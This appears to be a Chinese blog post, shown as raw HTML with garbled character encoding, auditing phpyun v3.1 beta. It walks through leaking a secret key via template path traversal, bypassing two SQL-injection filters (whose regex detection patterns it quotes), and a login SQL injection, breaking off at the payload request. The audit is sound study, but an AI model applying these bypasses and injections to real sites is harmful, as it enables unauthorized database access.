<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="phpyun v3.1 betaä»£ç å®¡è®¡ç»ƒä¹ " />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            phpyun v3.1 betaä»£ç å®¡è®¡ç»ƒä¹ 
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="post-toc-text">è·¯ç”±åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-1"><span class="post-toc-text">waf 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-2"><span class="post-toc-text">waf 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sqlæ³¨å…¥</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="post-toc-text">æ³¨å…¥ä¸€</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="post-toc-text">æ³¨å…¥äºŒ</span></a></li></ol></li></ol>
            
        
        <blockquote>
<p>phpyunv3.1 beta</p>
<p>ç»•sqlé˜²å¾¡ï¼Œå®½å­—èŠ‚æ³¨å…¥</p>
<p>iconv(â€œutf-8â€,â€gbkâ€,$s)å¯¹character_set_client&#x3D;binaryå’Œå½±å“</p>
</blockquote>
<h2 id="è·¯ç”±åˆ†æ"><a href="#è·¯ç”±åˆ†æ" class="headerlink" title="è·¯ç”±åˆ†æ"></a>è·¯ç”±åˆ†æ</h2><pre><code class="php">&lt;?php
/* *
* $Author ï¼šPHPYUNå¼€å‘å›¢é˜Ÿ
*
* å®˜ç½‘: http://www.phpyun.com
*
* ç‰ˆæƒæ‰€æœ‰ 2009-2014 å®¿è¿é‘«æ½®ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸ï¼Œå¹¶ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚
*
* è½¯ä»¶å£°æ˜ï¼šæœªç»æˆæƒå‰æä¸‹ï¼Œä¸å¾—ç”¨äºå•†ä¸šè¿è¥ã€äºŒæ¬¡å¼€å‘ä»¥åŠä»»ä½•å½¢å¼çš„å†æ¬¡å‘å¸ƒã€‚
*/
include(dirname(__FILE__).&quot;/global.php&quot;);
if($config[&#39;webcache&#39;]==&quot;1&quot;)&#123;
    include_once(LIB_PATH.&quot;web.cache.php&quot;);
    $cache=new Phpyun_Cache(&#39;./cache&#39;,dirname(__FILE__).&quot;/&quot;,$config[&#39;webcachetime&#39;]);
    $cache-&gt;read_cache();
&#125;
$var=@explode(&#39;-&#39;,str_replace(&#39;/&#39;,&#39;-&#39;,$_GET[&#39;yunurl&#39;]));
foreach($var as $p)&#123;
    $param=@explode(&#39;_&#39;,$p);
    $_GET[$param[0]]=$param[1];
&#125;
unset($_GET[&#39;yunurl&#39;]);
if($_GET[&#39;m&#39;] &amp;&amp; !ereg(&quot;^[0-9a-zA-Z\_]*$&quot;,$_GET[&#39;m&#39;]))&#123;
    
    $_GET[&#39;m&#39;] = &#39;index&#39;;
&#125;
$model = $_GET[&#39;m&#39;];
$action = $_GET[&#39;c&#39;];
if($model==&quot;&quot;)	$model=&quot;index&quot;;
if($action==&quot;&quot;)	$action = &quot;index&quot;;
if(!is_file(MODEL_PATH.$model.&#39;.class.php&#39;))&#123;
    $controller=&#39;index&#39;;
    $action=&#39;index&#39;;
&#125;
require(MODEL_PATH.&#39;class/common.php&#39;);
require(&quot;model/&quot;.$model.&#39;.class.php&#39;);
$conclass=$model.&#39;_controller&#39;;
$actfunc=$action.&#39;_action&#39;;
$views=new $conclass($phpyun,$db,$db_config[&quot;def&quot;],&quot;index&quot;,$model);
if(!method_exists($views,$actfunc))&#123;
    $views-&gt;DoException();
&#125;
$views-&gt;$actfunc();
if($config[&#39;webcache&#39;]==&quot;1&quot;)&#123;
    $cache-&gt;CacheCreate();
&#125;
?&gt;
</code></pre>
<p>è¿™é‡Œçš„è·¯ç”±è¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼Œéƒ½æ˜¯ä»è¿™é‡Œå½“åšå…¥å£</p>
<p>å–mçš„å€¼ä½œä¸ºè¦å®ä¾‹åŒ–çš„ç±»ï¼Œcä½œä¸ºéœ€è¦è°ƒç”¨çš„æ–¹æ³•</p>
<p>urlä¾‹å­ï¼š<code>http://192.168.91.39:8082/index.php?m=com&amp;c=search&amp;job1=35</code></p>
<h2 id="waf-1"><a href="#waf-1" class="headerlink" title="waf 1"></a>waf 1</h2><p>åœ¨åŒ…å«çš„<code>global.php</code>æ–‡ä»¶é‡Œï¼Œå¼•å…¥äº†<code>db.safety.php</code>å’Œ<code>webscan360/360safe/360webscan.php</code>ä¸¤ä¸ªsqlæ³¨å…¥waf</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401161834365.png" alt="image-20240116183438291"></p>
<p><code>global.php</code></p>
<pre><code class="php">if($config[&#39;sy_istemplate&#39;]!=&#39;1&#39; || md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])!=$_POST[&#39;safekey&#39;])
&#123;
    foreach($_POST  as $id=&gt;$v)&#123;
        safesql($id,$v,&quot;POST&quot;,$config);
        $id = sfkeyword($id,$config);
        $v = sfkeyword($v,$config);
        $_POST[$id]=common_htmlspecialchars($v);
    &#125;
&#125;
</code></pre>
<p>è¿™é‡Œå¯¹sqlæ³¨å…¥è¿›è¡Œé˜²å¾¡çš„å‡½æ•°ä¸º<code>safesql</code></p>
<pre><code class="php">function safesql($StrFiltKey,$StrFiltValue,$type)&#123;
    
     $getfilter = &quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;

    $postfilter = &quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;

    $cookiefilter = &quot;benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
    
    if($type==&quot;GET&quot;)
    &#123;
        $ArrFiltReq = $getfilter;

    &#125;elseif($type==&quot;POST&quot;)&#123;
        
        $ArrFiltReq = $postfilter;
    
    &#125;elseif($type==&quot;COOKIE&quot;)&#123;

        $ArrFiltReq = $cookiefilter;
    &#125;
    if(is_array($StrFiltValue))
    &#123;
        foreach($StrFiltValue as $key=&gt;$value)
        &#123;
            safesql($key,$value,$type);
        &#125;
    &#125;else&#123;
        if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,html_entity_decode($StrFiltValue,ENT_NOQUOTES,&quot;GB2312&quot;))==1)
        &#123;
             exit(safe_pape());
        &#125;
    &#125;
    if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$StrFiltKey)==1)
    &#123;
         exit(safe_pape());
    &#125;
&#125;
</code></pre>
<p>åªè¦ä¸è¿›å…¥è¿™ä¸ªifè¯­å¥ï¼Œå°±èƒ½ç»•è¿‡è¿™ä¸ªwafï¼Œç„¶åå†POSTä¼ å‚é‡Œè¿›è¡Œsqlæ³¨å…¥</p>
<pre><code class="php">if($config[&#39;sy_istemplate&#39;]!=&#39;1&#39; || md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])!=$_POST[&#39;safekey&#39;])
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162007991.png" alt="image-20240116200738950"></p>
<p>è¿™é‡Œ<code>$config[&#39;sy_istemplate&#39;]</code>çš„å€¼ä¸º1ï¼Œæ˜¯configé‡Œå®šä¹‰çš„ï¼Œä¸å¯æ§çš„</p>
<p>æ‰€ä»¥åªè¦æ»¡è¶³<code>md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])==$_POST[&#39;safekey&#39;]</code>å³å¯</p>
<p><code>$config[&#39;sy_safekey&#39;]</code>çš„å€¼æ˜¯åœ¨å®‰è£…çš„æ—¶å€™éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ä¸å¯æ§çš„ã€‚ç°åœ¨çš„ä»»åŠ¡å°±æ˜¯å¦‚ä½•ä»ç”¨æˆ·å±‚é¢è·å¾—è¿™ä¸ªå€¼ã€‚</p>
<p>å…¨å±€æœç´¢ï¼Œå‘ç°é™¤äº†åœ¨<code>plus/config.php</code>æ–‡ä»¶ä¸­å­˜åœ¨ï¼Œè¿˜å¯ä»¥é€šè¿‡æ¨¡æ¿æ¸²æŸ“å‡ºæ¥</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162011435.png" alt="image-20240116201110232"></p>
<p>è¿™å¥—ä»£ç ç”¨äº†smartyä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“</p>
<p>åœ¨<code>global.php</code>é‡Œä¼šåˆ›å»ºsmartyå¯¹è±¡ï¼Œå¹¶è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</p>
<pre><code class="php">$phpyun = new smarty();
$phpyun-&gt;template_dir = APP_PATH.&#39;/template/&#39;;
$phpyun-&gt;compile_dir  = APP_PATH.&#39;/templates_c/&#39;;
$phpyun-&gt;cache_dir    = APP_PATH.&#39;/cache/&#39;;
$phpyun-&gt;left_delimiter = &quot;&#123;yun:&#125;&quot;;
$phpyun-&gt;right_delimiter = &quot;&#123;/yun&#125;&quot;;
</code></pre>
<p>smartyæ¯”è¾ƒå¸¸ç”¨çš„å‡ ä¸ªæ–¹æ³•</p>
<pre><code class="php">smarty()-&gt;assign($tpl_var, $value = null)//ç»™å˜é‡åç»‘å®šå€¼
smarty()-&gt;display($resource_name, $cache_id = null, $compile_id = null)//æ¸²æŸ“ç‰¹å®šçš„æ–‡ä»¶ï¼Œå¹¶å°†å€¼æ‰“å°å‡ºæ¥
</code></pre>
<p>åœ¨<code>index.php</code></p>
<pre><code class="php">require(MODEL_PATH.&#39;class/common.php&#39;);
require(&quot;model/&quot;.$model.&#39;.class.php&#39;);
$conclass=$model.&#39;_controller&#39;;
$actfunc=$action.&#39;_action&#39;;
$views=new $conclass($phpyun,$db,$db_config[&quot;def&quot;],&quot;index&quot;,$model);
</code></pre>
<p>è¿™é‡Œçš„<code>$model.&#39;_controller&#39;</code>ç±»å¤§å¤šæ•°æ˜¯ç»§æ‰¿äº†commonç±»ï¼Œæ‰€ä»¥åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œéƒ½ä¼šå…ˆæ‰§è¡Œcommonç±»é‡Œçš„commonå‡½æ•°</p>
<p>åœ¨<code>common::common($tpl,$db,$def=&quot;&quot;,$model=&quot;index&quot;,$m=&quot;&quot;)</code>é‡Œï¼Œå°±æœ‰å¯¹smartyå¯¹è±¡è¿›è¡Œæ“ä½œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162028775.png" alt="image-20240116202850617"></p>
<p>è·Ÿè¿›yunsetï¼Œä»–å°±æ˜¯è¿›è¡Œå˜é‡ç»‘å®šçš„æ“ä½œ</p>
<pre><code class="php">function yunset($name,$value)&#123;

    $this-&gt;tpl-&gt;assign($name,$value);
&#125;
</code></pre>
<p>æ‰€ä»¥åœ¨commoné‡Œï¼Œconfigçš„å€¼æ˜¯å·²ç»è¢«èµ‹äºˆäº†smartyæ¨¡æ¿é‡Œçš„å˜é‡çš„</p>
<p>åªè¦å†æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶smartyæ¸²æŸ“çš„ç›®æ ‡æ¨¡æ¿æ–‡ä»¶ä¸ºæˆ‘ä»¬ä¸Šé¢æ‰¾åˆ°çš„<code>template/admin/admin_web_config.htm</code></p>
<p>è¿™æ ·å°±èƒ½è·å¾—<code>$config[&#39;sy_safekey&#39;]</code>çš„å€¼</p>
<p>åœ¨commonç±»é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥è¿›è¡Œdisplayçš„æ“ä½œ</p>
<pre><code class="php">function yuntpl($tplarr=array())&#123;
    if(is_array($tplarr) &amp;&amp; $tplarr!=&#39;&#39;)&#123;
        foreach($tplarr as $v)&#123;
            $this-&gt;tpl-&gt;display($v.&quot;.htm&quot;);
        &#125;
    &#125;else&#123;
        echo &quot;æ¨¡ç‰ˆä¸èƒ½ä¸ºç©ºï¼&quot;;die;
    &#125;
&#125;

function yun_tpl($tplarr=array())&#123;
    if(is_array($tplarr) &amp;&amp; $tplarr!=&#39;&#39;)&#123;
        foreach($tplarr as $v)&#123;
            $rand=mktime();
            $this-&gt;tpl-&gt;display($this-&gt;config[&#39;style&#39;].&quot;/&quot;.$this-&gt;m.&quot;/&quot;.$v.&quot;.htm&quot;);
        &#125;
    &#125;else&#123;
        echo &quot;æ¨¡ç‰ˆä¸èƒ½ä¸ºç©ºï¼&quot;;die;
    &#125;
&#125;
</code></pre>
<p>åªè¦æ‰¾åˆ°ä¼šè°ƒç”¨yuntplæˆ–è€…yun_tplçš„ç±»ï¼Œå¹¶ä¸”æ¸²æŸ“çš„æ–‡ä»¶å¯æ§</p>
<p>æœ€åæ‰¾åˆ°<code>company/model/index.class.php</code>ï¼Œåœ¨ä»–çš„<code>index_action()</code>å‡½æ•°æœ€å</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162036860.png" alt="image-20240116203636703"></p>
<pre><code class="php">$tp=$_GET[&#39;tp&#39;]?$_GET[&#39;tp&#39;]:&quot;index&quot;;
$this-&gt;seo(&quot;company_&quot;.$tp);
$this-&gt;yunset(&quot;com_style&quot;,$this-&gt;config[&#39;sy_weburl&#39;].&quot;/template/company/&quot;.$tplurl.&quot;/&quot;);
$this-&gt;yunset(&quot;comstyle&quot;,&quot;../template/company/&quot;.$tplurl.&quot;/&quot;);
$this-&gt;yunset(&quot;defaultstyle&quot;,&quot;../template/default/&quot;);
$this-&gt;yuntpl(array(&#39;company/&#39;.$tplurl.&quot;/&quot;.$tp));
</code></pre>
<p>æ¸²æŸ“çš„æ–‡ä»¶æ˜¯å¯ä»¥æ§åˆ¶çš„</p>
<p>åŒæ—¶è¿˜è¦æ³¨æ„å‰é¢ï¼Œå¿…é€‰è¦å­˜åœ¨ä¼ä¸šï¼Œæ‰å¯ä»¥èµ°åˆ°è¿™ä¸€æ­¥</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162041729.png" alt="image-20240116204111676"></p>
<p>æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªä¼ä¸šå³å¯</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®¿é—®ä»¥ä¸‹urlï¼Œå°±å¯ä»¥è·å¾—<code>$config[&#39;sy_safekey&#39;]</code>çš„å€¼</p>
<p><code>http://192.168.91.39:8082/company/index.php?m=index&amp;c=index&amp;tp=../../admin/admin_web_config&amp;id=1</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162044513.png" alt="image-20240116204425428"></p>
<p>å¾—åˆ°<code>$config[&#39;sy_safekey&#39;]</code>çš„å€¼åå°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªwafäº†</p>
<h2 id="waf-2"><a href="#waf-2" class="headerlink" title="waf 2"></a>waf 2</h2><p>åœ¨ç»è¿‡ç¬¬ä¸€ä¸ªwafåï¼Œè¿˜æœ‰<code>include/webscan360/360safe/360webscan.php</code>é‡Œçš„</p>
<pre><code class="php">if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url)) &#123;
    
  if ($webscan_get) &#123;

    foreach($_GET as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$getfilter,&quot;GET&quot;);
    &#125;
  &#125;
  if ($webscan_post) &#123;
    foreach($_POST as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$postfilter,&quot;POST&quot;);
    &#125;
  &#125;
  if ($webscan_cookie) &#123;
    foreach($_COOKIE as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$cookiefilter,&quot;COOKIE&quot;);
    &#125;
  &#125;
  if ($webscan_referre) &#123;
    foreach($webscan_referer as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$postfilter,&quot;REFERRER&quot;);
    &#125;
  &#125;
&#125;
</code></pre>
<p>åŒæ ·çš„æ€è·¯ï¼Œä¸ä»…è¿™ä¸ªifè¯­å¥å°±å¯ä»¥ç»•è¿‡</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162050381.png" alt="image-20240116205027303"></p>
<p><code>$webscan_switch</code>å›ºå®šä¸º1ï¼Œéœ€è¦è®©<code>webscan_white()</code>è¿”å›ä¸ºfalse</p>
<p><code>$webscan_white_directory</code>çš„å€¼ä¸º<code>admin|\/dede\/|\/install\/</code></p>
<p><code>$webscan_white_url</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå€¼ä¸º</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162057038.png" alt="image-20240116205716910"></p>
<p>è·Ÿè¿›webscan_white</p>
<pre><code class="php">function webscan_white($webscan_white_name,$webscan_white_url=array()) &#123;
  $url_path=$_SERVER[&#39;PHP_SELF&#39;];
  $url_var=$_SERVER[&#39;QUERY_STRING&#39;];
  if (preg_match(&quot;/&quot;.$webscan_white_name.&quot;/is&quot;,$url_path)==1) &#123;
    return false;
  &#125;
  foreach ($webscan_white_url as $key =&gt; $value) &#123;
    if(!empty($url_var)&amp;&amp;!empty($value))&#123;
      if (stristr($url_path,$key)&amp;&amp;stristr($url_var,$value)) &#123;
        return false;
      &#125;
    &#125;
    elseif (empty($url_var)&amp;&amp;empty($value)) &#123;
      if (stristr($url_path,$key)) &#123;
        return false;
      &#125;
    &#125;

  &#125;

  return true;
&#125;
</code></pre>
<p>è¿™é‡Œæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦æ»¡è¶³<code>stristr($url_path,$key)&amp;&amp;stristr($url_var,$value)</code>å³å¯</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162055563.png" alt="image-20240116205540490"></p>
<p>è¿™é‡Œçš„<code>$url_path</code>å’Œ<code>$url_var</code>éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„</p>
<p>è®©<code>$url_path</code>é‡Œæœ‰<code>index.php</code>ï¼Œè¿™ä¸ªå¾ˆå¥½æ»¡è¶³ï¼Œå› ä¸ºéƒ½æ˜¯ä»è¿™é‡Œå¼€å§‹çš„</p>
<p>è®©<code>$url_var</code>é‡Œæœ‰<code>admin_dir=admin</code>ï¼Œè¿™ä¸ªä¹Ÿå¾ˆç®€å•ï¼Œè¿™ä¸ªå‚æ•°ä¸ä¼šå½±å“æˆ‘å‡½æ•°çš„æ‰§è¡Œ</p>
<p>æ‰€ä»¥ç»•è¿™ä¸ªwafçš„urlä¸º</p>
<p><code>http://192.168.91.39:8082/company/index.php?admin_dir=admin&amp;sql=xxxx</code></p>
<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>è¿™é‡Œæœ‰ä¿©ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯ä½œè€…çš„å‚»é€¼æ“ä½œå¯¼è‡´çš„æ³¨å…¥ï¼Œå¦ä¸€ä¸ªæ˜¯å› ä¸ºå¯¹mysqlçš„é…ç½®è¿›è¡Œçš„å®½å­—èŠ‚æ³¨å…¥</p>
<h3 id="æ³¨å…¥ä¸€"><a href="#æ³¨å…¥ä¸€" class="headerlink" title="æ³¨å…¥ä¸€"></a>æ³¨å…¥ä¸€</h3><p><code>db.safety.php</code>é‡Œçš„<code>quotesGPC();</code>ä¼šå°†è¾“å…¥è¿›è¡Œ<code>addslashes()</code>æ“ä½œï¼Œå°±æ˜¯å¯¹ç¬¦å·æ·»åŠ è½¬ä¹‰å­—ç¬¦</p>
<pre><code class="php">function quotesGPC() &#123;

    if(!get_magic_quotes_gpc())&#123;
     	$_POST = array_map(&quot;addSlash&quot;, $_POST);
        $_GET = array_map(&quot;addSlash&quot;, $_GET);
        $_COOKIE = array_map(&quot;addSlash&quot;, $_COOKIE);
    &#125;

&#125;
function addSlash($el) &#123;
    if (is_array($el))
        return array_map(&quot;addSlash&quot;, $el);
    else
        return addslashes($el);
&#125;
</code></pre>
<p>åœ¨æ‰‹æœºç‰ˆçš„ç™»å½•å‡½æ•°é‡Œï¼Œä½œè€…åšäº†ä¸€ä¸ªéå¸¸å¥‡æ€ªçš„æ“ä½œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162115352.png" alt="image-20240116211542261"></p>
<p><code>wap/model/login.class.php</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162117202.png" alt="image-20240116211705046"></p>
<pre><code class="php">$username = str_replace(&#39;\\&#39;,&#39;&#39;,$_POST[&#39;username&#39;]);
......
$userinfo = $this-&gt;obj-&gt;DB_select_once(&quot;member&quot;,&quot;`username`=&#39;&quot;.str_replace(&#39;\\&#39;,&#39;&#39;,$_POST[&#39;username&#39;]).&quot;&#39; and usertype=&#39;&quot;.$usertype.&quot;&#39;&quot;,&quot;username,usertype,password,uid,salt&quot;);
</code></pre>
<p>ä»–è‡ªå·±æŠŠè½¬ä¹‰ç¬¦å·<code>\</code>ç»™å»æ‰äº†ï¼ŒçœŸç¦»è°±</p>
<p>æ‰€ä»¥è¿™é‡Œçš„æ³¨å…¥payload</p>
<pre><code>POST /wap/index.php?m=login&amp;c=index&amp;admin_dir=admin HTTP/1.1
